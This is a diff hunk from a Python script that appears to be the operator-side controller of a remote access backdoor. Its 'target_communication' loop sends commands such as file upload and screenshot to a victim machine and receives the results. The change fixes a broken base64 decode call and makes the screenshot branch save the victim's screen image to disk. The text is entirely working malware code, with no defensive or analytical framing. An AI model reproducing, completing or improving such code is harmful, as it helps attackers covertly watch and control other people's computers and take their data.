@@ -85,16 +85,11 @@ def target_communication():
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
         elif command == 'screenshot':
-            # If the user enters 'screenshot', send a command to take a screenshot on the target.
+            # Receive and print the screenshot data from the target.
             result = reliable_recv()
-            if result:
-                with open('screenshot.png', 'wb') as f:
-                    f.write(base64.b4decode(result))
-                # If the screenshot command is successful, print the result.
-                print('[+] Screenshot taken successfully.')
-            else:
-                # If the screenshot command fails, print an error message.
-                print('[-] Failed to take screenshot.')
+            with open('screenshot.png', 'wb') as f:
+                f.write(base64.b64decode(result))
+            print('[+] Screenshot saved as screenshot.png')
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
